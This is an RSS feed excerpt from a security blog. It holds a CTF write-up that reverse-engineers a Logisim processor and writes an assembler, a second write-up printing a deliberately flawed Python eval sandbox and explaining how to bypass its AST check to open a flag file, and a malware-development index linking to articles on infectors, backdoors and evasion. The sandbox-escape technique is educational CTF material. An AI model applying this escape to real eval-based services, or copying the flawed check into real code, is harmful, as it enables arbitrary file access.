      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
:start
	movl cx, 10
	clr
	movl bx,  1
	movl dx,  0
	mmiv 0x0,  dx
	movl bx,  :sub4
	call bx,  0
	mmov ax, 0x0
	movl bx,  :sub5
	call bx,  0
:sub1
	movl bx,  1
	movl dx,  0
	push dx,  0
	movl bx,  :sub5
	call bx,  0
	movl bx,  1
	sub  bx,  0
	cmp  ax, ax
	movl bx, :sub1
	jnz
	movl bx,  :sub4
	call bx,  0
:sub2
	movl bx,  0
	mmiv 0x1, bx
	mmiv 0x2, bx
:sub3
	pop  ax,  0
	movl bx,  1
	movl dx,  0
	movl bx,  :sub5
	call bx,  0
	mmov bx, 0x1
	msk
	mmiv 0x1, bx
	mmov bx, 0x2
	mskb
	mmiv 0x2, bx
	movl ax,  0xff
	cmp  bx, ax
	movl bx, :sub3
	jl
	movl bx,  0
	mmov dx, 0x1
	movl cx,  1
	movl cx,  0
	movl bx,  :sub2
	jmp  bx,  0
:sub4
	movl ax,  0x05
	movl bx,  :sub5
	call bx,  0
	movl bx,  1
	sub  bx,  0
	cmp  ax,  ax
	movl bx,  :sub4&amp;#43;1
	jnz
	ret
:sub5
	movl cx,  4
	movl cx,  0
	ret
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;processor-analysis&#34;&gt;Processor Analysis&lt;/h2&gt;
&lt;p&gt;Once we open the &lt;code&gt;cpu.circ&lt;/code&gt; in logisim as stated, we can see that we have a whole processor that shows up :
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cpu.png&#34; alt=&#34;processor&#34;&gt;&lt;/p&gt;
&lt;p&gt;This processor is an electronic circuit powered by a clock. The first interesting part of the circuit are :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_clock.png&#34; alt=&#34;Clock&#34;&gt;
Fig 1. Clock Cycle
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_RAM.png&#34; alt=&#34;RAM&#34;&gt;
Fig 2. RAM and instruction loading&lt;/p&gt;
&lt;p&gt;On &lt;code&gt;Fig 1&lt;/code&gt;, we can see that the clock system is gonna cycle on 5 wires. The two first ones are the one coming from the top on &lt;code&gt;Fig 2&lt;/code&gt;. The first wire is gonna power the &lt;code&gt;WR&lt;/code&gt; register and the last four are respectively named Decode, Execute, Store and Clear. We can see on &lt;code&gt;Fig 2&lt;/code&gt; that a typical cycle will load the content of the current element (3 bytes) of the RAM in the &lt;code&gt;WR&lt;/code&gt; register and then split its three bytes in 3 different registers : &lt;code&gt;IR&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;. Those bytes are then used by the CU module which probably stands for Control Unit :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cu.png&#34; alt=&#34;CU&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the Control Unit, we can see that there are a lot of blocks on the left side carrying the instructions name, we can guess that it is in those blocks that the instructions are executed. Those blocks are (almost) all directly plugged to &lt;code&gt;IR&lt;/code&gt; and when going inside the blocks we can see that they are also plugged to either &lt;code&gt;RA&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;, or none. We can assume that &lt;code&gt;IR&lt;/code&gt; is gonna be the Instruction Register, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt; are gonna contain respectively the first and second operand of the instructions. Except for some special cases (&lt;code&gt;mov&lt;/code&gt;, &lt;code&gt;movl&lt;/code&gt;, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;), every instruction contains a AND logic gate plugged on each of the five last bits of &lt;code&gt;IR&lt;/code&gt; where some of the bits are being NOT.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_gate.png&#34; alt=&#34;gate&#34;&gt;
Fig 3. CMP instruction logic gate&lt;/p&gt;
&lt;p&gt;Here we can see that &lt;code&gt;cmp&lt;/code&gt; is switched on by the &lt;code&gt;10011&lt;/code&gt; sequence (0x13), we can see that all these gates are unique so we can use them to retrieve the opcodes of all the instructions which gives us the following translation table :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Opcode&lt;/th&gt;
&lt;th&gt;Instruction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;add&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1&lt;/td&gt;
&lt;td&gt;sub&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x2&lt;/td&gt;
&lt;td&gt;mul&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3&lt;/td&gt;
&lt;td&gt;clr&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x4&lt;/td&gt;
&lt;td&gt;rst&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x5&lt;/td&gt;
&lt;td&gt;jmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x6&lt;/td&gt;
&lt;td&gt;ljmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x7&lt;/td&gt;
&lt;td&gt;jlp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x8&lt;/td&gt;
&lt;td&gt;jg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x9&lt;/td&gt;
&lt;td&gt;jge&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xa&lt;/td&gt;
&lt;td&gt;jl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xb&lt;/td&gt;
&lt;td&gt;jle&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xc&lt;/td&gt;
&lt;td&gt;je&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xd&lt;/td&gt;
&lt;td&gt;jz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xe&lt;/td&gt;
&lt;td&gt;jnz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xf&lt;/td&gt;
&lt;td&gt;div&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;movl*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x11&lt;/td&gt;
&lt;td&gt;call&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x12&lt;/td&gt;
&lt;td&gt;ret&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x13&lt;/td&gt;
&lt;td&gt;cmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x14&lt;/td&gt;
&lt;td&gt;push&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x15&lt;/td&gt;
&lt;td&gt;pop&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x17&lt;/td&gt;
&lt;td&gt;mmiv&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x18&lt;/td&gt;
&lt;td&gt;mmov&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;*The movl instruction isn’t directly plugged to &lt;code&gt;IR&lt;/code&gt;, it is the multiplexers on the right that are plugged to &lt;code&gt;IR&lt;/code&gt; and will execute (or not) movl depending on its value. But we can still guess its value by looking at the opcodes of &lt;code&gt;example.data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now that we did that, we can try to guess how the operands are encoded. We will first look at the first two instructions of &lt;code&gt;example.asm&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; ax, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Those are encoded as : &lt;code&gt;10000a 100101&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We know that 0x10 represents &lt;code&gt;movl&lt;/code&gt;, we can assume that literals are transmitted as so in the machine code (0xa = 10). Seeing that &lt;code&gt;ax&lt;/code&gt; is encoded as 0x00 and &lt;code&gt;bx&lt;/code&gt; as 0x01, we can establish this register encoding table:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Register&lt;/th&gt;
&lt;th&gt;Encoding&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ax&lt;/td&gt;
&lt;td&gt;0x00&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;bx&lt;/td&gt;
&lt;td&gt;0x01&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cx&lt;/td&gt;
&lt;td&gt;0x02&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dx&lt;/td&gt;
&lt;td&gt;0x03&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Last thing we need is knowing how labels are encoded. We will now look at the instruction that uses a label :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, :sub1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This instruction has been encoded as &lt;code&gt;100101&lt;/code&gt;. Now, we know that &lt;code&gt;sub1&lt;/code&gt;’s value is &lt;code&gt;01&lt;/code&gt;. Since &lt;code&gt;sub1&lt;/code&gt; starts at the second instruction, which has index 1 in the RAM, we can guess that labels are encoded as their index in the RAM.&lt;/p&gt;
&lt;p&gt;We now have almost everything we need to write our compiler. We can see two unknown instructions in the code of the program that we don’t have opcodes for, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;. We can see by looking at their module that they are setting the output register to :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;msk&lt;/span&gt; : (ax &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; dx) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mskb&lt;/span&gt; : dx &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As &lt;code&gt;movl&lt;/code&gt;, those instructions are always “executed” since they are not directly plugged to &lt;code&gt;IR&lt;/code&gt; but the multiplexer that is sending the result into output is so by manually setting registers and &lt;code&gt;IR&lt;/code&gt;, we can identify the opcodes by looking at the value of the CU’s output register (we didn’t manage to find a way to examine the internal circuits of the multiplexers and reading the XML seemed painful). By trying the few opcodes left, we got :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Opcode&lt;/th&gt;
&lt;th&gt;Instruction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x1a&lt;/td&gt;
&lt;td&gt;msk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1b&lt;/td&gt;
&lt;td&gt;mskb&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;Now that understand how the processor is working we can try to make a compiler to compile &lt;code&gt;program.asm&lt;/code&gt; into &lt;code&gt;program.data&lt;/code&gt;.
To do so we have to clarify a few things first :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Another odd thing in the code is the &lt;code&gt;sub5&lt;/code&gt; value that is not preceded by colons unlike the others, we assumed that it didn’t matter and it worked (we added the colons in the file to make the compiler simpler).&lt;/li&gt;
&lt;li&gt;Last thing we didn’t mention is that every instruction that needs less than two operands is padded with zeros so it stays 3-bytes long (we’d like to thank the challenge maker for putting zeros in the code when the second operand was useless, it makes the compiler way easier to make).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here comes our compiler :&lt;/p&gt;
&lt;p&gt;


  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;compiler.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
def get_instruction_type(instruction):
    if instruction[0] == &amp;#39;:&amp;#39;:
        return &amp;#39;label&amp;#39;
    return &amp;#39;instruction&amp;#39;

def get_opcode(instr):
    translate_table = [
        &amp;#34;add&amp;#34;,
        &amp;#34;sub&amp;#34;,
        &amp;#34;mul&amp;#34;,
        &amp;#34;clr&amp;#34;,
        &amp;#34;rst&amp;#34;,
        &amp;#34;jmp&amp;#34;,
        &amp;#34;ljmp&amp;#34;,
        &amp;#34;jlp&amp;#34;,
        &amp;#34;jg&amp;#34;,
        &amp;#34;jge&amp;#34;,
        &amp;#34;jl&amp;#34;,
        &amp;#34;jle&amp;#34;,
        &amp;#34;je&amp;#34;,
        &amp;#34;jz&amp;#34;,
        &amp;#34;jnz&amp;#34;,
        &amp;#34;mov&amp;#34;,
        &amp;#34;movl&amp;#34;,
        &amp;#34;call&amp;#34;,
        &amp;#34;ret&amp;#34;,
        &amp;#34;cmp&amp;#34;,
        &amp;#34;push&amp;#34;,
        &amp;#34;pop&amp;#34;,
        &amp;#34;div&amp;#34;,
        &amp;#34;mmiv&amp;#34;,
        &amp;#34;mmov&amp;#34;,
        &amp;#34;&amp;#34;,
        &amp;#34;msk&amp;#34;,
        &amp;#34;mskb&amp;#34;
    ]
    return format(translate_table.index(instr), &amp;#39;02x&amp;#39;)


def get_label_encoded(word, labels):
    # Very ugly but there is only one so it&amp;#39;s fine
    if &amp;#39;&amp;#43;1&amp;#39; in word:
        return &amp;#39;2f&amp;#39;
    else:
        return labels[word]

def get_operand_code(word, labels):
    regs = [&amp;#39;ax&amp;#39;, &amp;#39;bx&amp;#39;, &amp;#39;cx&amp;#39;, &amp;#39;dx&amp;#39;]
    if &amp;#39;:&amp;#39; in word:
        return get_label_encoded(word, labels)
    if &amp;#39;x&amp;#39; in word:
        if word in regs:
            return format(regs.index(word), &amp;#39;02x&amp;#39;)
        else:
            return format(int(word, 16), &amp;#39;02x&amp;#39;)
    else:
        return format(int(word), &amp;#39;02x&amp;#39;)


def get_instruction_sequence(instruction, labels):
    words = instruction.split()
    opcode = get_opcode(words[0])
    op1 = &amp;#39;00&amp;#39;
    op2 = &amp;#39;00&amp;#39;
    if len(words) == 3:
        op1 = get_operand_code(words[1].strip(&amp;#39;,&amp;#39;), labels)
        op2 = get_operand_code(words[2], labels)
    return opcode &amp;#43; op1 &amp;#43; op2

if __name__ == &amp;#39;__main__&amp;#39;:
    # don&amp;#39;t forget to add the &amp;#39;:&amp;#39; in front of sub5 line 53 or compiler will crash
    program_file = &amp;#39;./program.asm&amp;#39;
    output_file = &amp;#39;./program.data&amp;#39;
    filestream = open(program_file)
    program = filestream.read().splitlines()
    filestream.close()
    labels = {}
    data = []
    for index, instruction in enumerate(program):
        type = get_instruction_type(instruction)
        if type == &amp;#39;label&amp;#39;:
            labels[instruction] = format(index - len(labels), &amp;#39;02x&amp;#39;)
    # print(labels)
    for instruction in program:
        type = get_instruction_type(instruction)
        if type == &amp;#39;instruction&amp;#39;:
            data.append(get_instruction_sequence(instruction.strip(), labels))
    filestream = open(output_file, &amp;#39;w&amp;#39;)
    filestream.write(&amp;#39; &amp;#39;.join(data))
    filestream.close()
    print(&amp;#39;Program has been compiled in :&amp;#39;, output_file)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


a
Once our compiler has been written, we just have to compile the program, import it in the RAM then launch the simulation.
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_compiled.png&#34; alt=&#34;import&#34;&gt;
After a little while (a long while if you don’t increase the auto-tick frequency), the flag will be displayed on the TTY to the right.
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_flag.png&#34; alt=&#34;flag&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Tree of danger - [HTB UNICTF 2021 - Qualifiers]</title>
      <link>https://alagroy-42.github.io/writeups/tree_of_danger/</link>
      <pubDate>Tue, 14 Jun 2022 14:53:57 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/tree_of_danger/</guid>
      <description>The Challenge python util.py #!/usr/bin/env python3.10 import ast import math from typing import Union def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool: match type(node): case ast.Constant: return True case ast.List | ast.Tuple | ast.Set: return is_sequence_safe(node) case ast.Dict: return is_dict_safe(node) case ast.Name: return node.id == &amp;#34;math&amp;#34; and isinstance(node.ctx, ast.Load) case ast.UnaryOp: return is_expression_safe(node.operand) case ast.BinOp: return is_expression_safe(node.left) and is_expression_safe(node.right) case ast.Call: return is_call_safe(node) case ast.Attribute: return is_expression_safe(node.value) case _: return False def is_sequence_safe(node: Union[ast.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;util.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/env python3.10

import ast
import math
from typing import Union


def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool:
    match type(node):
        case ast.Constant:
            return True
        case ast.List | ast.Tuple | ast.Set:
            return is_sequence_safe(node)
        case ast.Dict:
            return is_dict_safe(node)
        case ast.Name:
            return node.id == &amp;#34;math&amp;#34; and isinstance(node.ctx, ast.Load)
        case ast.UnaryOp:
            return is_expression_safe(node.operand)
        case ast.BinOp:
            return is_expression_safe(node.left) and is_expression_safe(node.right)
        case ast.Call:
            return is_call_safe(node)
        case ast.Attribute:
            return is_expression_safe(node.value)
        case _:
            return False


def is_sequence_safe(node: Union[ast.List, ast.Tuple, ast.Set]):
    return all(map(is_expression_safe, node.elts))


def is_dict_safe(node: ast.Dict) -&amp;gt; bool:
    for k, v in zip(node.keys, node.values):
        if not is_expression_safe(k) and is_expression_safe(v):
            return False
    return True


def is_call_safe(node: ast.Call) -&amp;gt; bool:
    if not is_expression_safe(node.func):
        return False
    if not all(map(is_expression_safe, node.args)):
        return False
    if node.keywords:
        return False
    return True


def is_safe(expr: str) -&amp;gt; bool:
    for bad in [&amp;#39;_&amp;#39;]:
        if bad in expr:
            # Just in case!
            return False
    return is_expression_safe(ast.parse(expr, mode=&amp;#39;eval&amp;#39;).body)


if __name__ == &amp;#34;__main__&amp;#34;:
    print(&amp;#34;Welcome to SafetyCalc (tm)!\n&amp;#34;
          &amp;#34;Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc&amp;#34;)
    while True:
        ex = input(&amp;#34;&amp;gt; &amp;#34;)
        if is_safe(ex):
            try:
                print(eval(ex))
            except Exception as e:
                print(f&amp;#34;Something bad happened! {e}&amp;#34;)
        else:
            print(&amp;#34;Unsafe command detected! The snake approaches...&amp;#34;)
            exit(-1)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;This Python script is gonna interpret python code with the &lt;code&gt;eval&lt;/code&gt; function after doing some parsing with the AST module. The parsing is gonna make sure that every component of the evaluated expression is safe. Function calls are only considered safe if they are part of the &lt;code&gt;math&lt;/code&gt; module. After reading the &lt;code&gt;math&lt;/code&gt; documentation, we realized that there was no way of doing nasty things with any function so we decided to try to bypass the AST checks.&lt;/p&gt;
&lt;h2 id=&#34;the-resolution&#34;&gt;The Resolution&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_source_code.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this function, the if statement line 37 doesn&amp;rsquo;t take into account operator precedence in Python, since &lt;code&gt;not&lt;/code&gt; has a higher precedence than &lt;code&gt;and&lt;/code&gt;, &lt;code&gt;not&lt;/code&gt; only applies to the key verification and not to the value verification. If it returns &lt;code&gt;True&lt;/code&gt;, then the value of the dictionary is not gonna be checked. Thanks to that vulnerability, we can embed the open symbol in the dictionary.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_embedded.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
&lt;p&gt;Function calls are sanitized with a check on &lt;code&gt;ast.Name&lt;/code&gt; values which checks any normal function call but not class methods that are considered by the AST module as &lt;code&gt;ast.Attribute&lt;/code&gt;. Dereferencing a dictionary by calling directly the value is an &lt;code&gt;ast.Subscript&lt;/code&gt; type of operation which returns &lt;code&gt;False&lt;/code&gt;. We then have to call &lt;code&gt;dictionary.get&lt;/code&gt; to get &lt;code&gt;open&lt;/code&gt; and then call it on &lt;code&gt;flag.txt&lt;/code&gt;. Once the file is opened, we simply need to add the read method to get the content of it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/tree_flag.png&#34; alt=&#34;vuln_func_code&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Malware Development</title>
      <link>https://alagroy-42.github.io/malware/</link>
      <pubDate>Tue, 14 Jun 2022 14:24:47 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware/</guid>
      <description>A quick dive into malware development Disclaimer First of all, I want to say that my point with this blog is not to encourage people to be black hats and do anything illegal. I deeply believe though that knowledge should be shared for a few reasons. First, there are some mean and malicious people out there and anyone working in Infosec should be able to understand what they do to prevent it.</description>
      <content>&lt;h1 id=&#34;a-quick-dive-into-malware-development&#34;&gt;A quick dive into malware development&lt;/h1&gt;
&lt;h2 id=&#34;disclaimer&#34;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;First of all, I want to say that my point with this blog is not to encourage people to be black hats and do anything illegal. I deeply believe though that knowledge should be shared for a few reasons. First, there are some mean and malicious people out there and anyone working in Infosec should be able to understand what they do to prevent it. Second, there are some very legitimate and responsible people working in red teaming whose job it is to write malware and if you want to become one of those, you will also have to learn it. Third, some aspects of malware development are technically very interesting and quite challenging which is also why I like it. Now that it is said, please be responsible with what you do.&lt;/p&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Malware is a word that is used to designate any malicious software which does things without the user consent. There are many families of malware, the most famous ones are :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ransomware: malware that will steal and encrypt all the data from a system and then ransom it against money&lt;/li&gt;
&lt;li&gt;viruses: malware that will self-replicate and infect other software, mainly legitimate, of a system.&lt;/li&gt;
&lt;li&gt;worms: malware that will self-replicate and spread through the network&lt;/li&gt;
&lt;li&gt;trojans: software that looks legitimate but that will actually harm the computer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We will mainly focus on viruses here because it is how I started and even though they are not as widely used today as they used to be, they are still a good way to grasp some very low-level concepts that are still widely used on modern malware.&lt;/p&gt;
&lt;p&gt;Before getting in the topic, I strongly recommend working inside a virtual machine, it will allow you to launch your virus safely without being afraid of infecting yourself.&lt;/p&gt;
&lt;p&gt;Now that you have a virtual machine installed and configured, let&amp;rsquo;s start !&lt;/p&gt;
&lt;h3 id=&#34;disclaimer-2&#34;&gt;Disclaimer #2&lt;/h3&gt;
&lt;p&gt;Even though this blog will speak about malware development, most of the concepts that we will discuss here are quite important to get a grasp on for your malware development journey but it is not sufficient enough to write any piece of properly malicious code in the modern world. Though code will be shown in these articles, it is mostly concerning file infectors which are actually harmless and quite out-to-date malware. In case you would be here to get a hand on some usable piece of malware, you can just pass your way but if you are really interested in infosec and its wide diversity of topics, please read along!&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_basics/&#34;&gt;Infectors: How to make a simple self-replicating program on Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_advanced/&#34;&gt;Advanced infectors: How to make our infector stealthy and hardly detectable&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/simple_backdoor&#34;&gt;The payload: How to setup a simple backdoor on a computer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/obfuscation_techniques&#34;&gt;Obfuscation: The Art of pissing off reverse-engineers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/oligomorphism&#34;&gt;Oligomorphism: How to encrypt our virus and evade signature-based detection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>CTFs</title>
      <link>https://alagroy-42.github.io/ctfs/</link>
      <pubDate>Tue, 14 Jun 2022 14:24:19 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/ctfs/</guid>
      <description>Here are the different CTFs I took part of with the team I was in and our ranking.
2022 HackTheBox University CTF 2022 - Jeopardy/FullPwn Team: 42 FR Ranking 4/942 Hunt EGE 2022 - On-site OSINT CTF and Hunt in Paris Team: APT42 Ranking: #4/13 SaarCTF 2022 - Attack/Defense Team: APTduoquadra Ranking: #26/88 HackTheBox Uni CTF 2021 Finals - Jeopardy/FullPwn Team: APTduoquadra Ranking: #3/25 2021 HackTheBox Uni CTF 2021 Qualifiers - Jeopardy/FullPwn CTF open for every university in the world Team: APTduoquadra Ranking: #2/576 Bambictf #6 - Beginner-oriented Attack/Defense CTF Team: APTduoquadra Ranking: #34/60 </description>
      <content>&lt;p&gt;Here are the different CTFs I took part of with the team I was in and our ranking.&lt;/p&gt;
&lt;h1 id=&#34;2022&#34;&gt;2022&lt;/h1&gt;
&lt;h3 id=&#34;hackthebox-university-ctf-2022---jeopardyfullpwn&#34;&gt;HackTheBox University CTF 2022 - Jeopardy/FullPwn&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Team: 42 FR&lt;/li&gt;
&lt;li&gt;Ranking 4/942&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hunt-ege-2022---on-site-osint-ctf-and-hunt-in-paris&#34;&gt;Hunt EGE 2022 - On-site OSINT CTF and Hunt in Paris&lt;/h3&gt;
&lt;ul&gt;
